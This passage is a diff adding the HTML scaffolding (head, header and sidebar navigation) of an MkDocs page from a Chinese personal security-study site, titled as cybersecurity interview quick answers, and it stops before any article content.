@@ -1,0 +1,4098 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="安全学习笔记 × 青春记录 | 一个可以安全试错的环境">
+      
+      
+        <meta name="author" content="ethicalpaws">
+      
+      
+        <link rel="canonical" href="https://ethicalpaws.github.io/youth-sandbox/tech-study/weekly-check/Daily-Question/Interview-Handbook-quickly/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>网络安全面试速答篇（每日一题 · 82 Day 版） - 青春沙盒</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/timeago.css">
+    
+      <link rel="stylesheet" href="../../../../assets/css/extra.css">
+    
+      <link rel="stylesheet" href="../../../../assets/css/home.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+      <link rel="stylesheet" href="../../../../asserts/css/hacker-theme.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#82-day" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="青春沙盒" class="md-header__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            青春沙盒
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              网络安全面试速答篇（每日一题 · 82 Day 版）
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ethicalpaws/youth-sandbox" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    youth-sandbox
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  $技术学习
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../life/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  青春记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../bridge/novel/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  修桥工程
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../updates/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  动态推送
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../spiritual/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  精神食粮
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../about/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  关于本站
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../role-panel/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  ❗️ 角色档案
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="青春沙盒" class="md-nav__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
+
+    </a>
+    青春沙盒
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ethicalpaws/youth-sandbox" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    youth-sandbox
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    $技术学习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    $技术学习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../knowledge/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📖 知识笔记
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📖 知识笔记
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/01-foundation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    01-基础知识
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/02-network-protocol-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    02-网络协议安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/03-web-basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    03-Web基础漏洞
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--🔄"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/04-web-advanced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    04-Web高级漏洞
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--⬜"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/05-java-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    05-Java安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/06-red-blue-confrontation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    06-红蓝对抗
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../practice/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 实战练习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎯 实战练习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF训练
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/cve/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE分析
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/src/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SRC实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📋 每周检测
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📋 每周检测
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    青春记录
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    青春记录
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/study-plan/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📝 每周计划
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📝 每周计划
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/study-plan/summer-plan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    暑期计划
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--进行中"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/study-plan/week5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第二阶段第一周
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--进行中"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/journal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📔 随笔日记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/struggles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💭 烦恼记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/wins/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎉 成就时刻
+  
+
+    
+  </span>
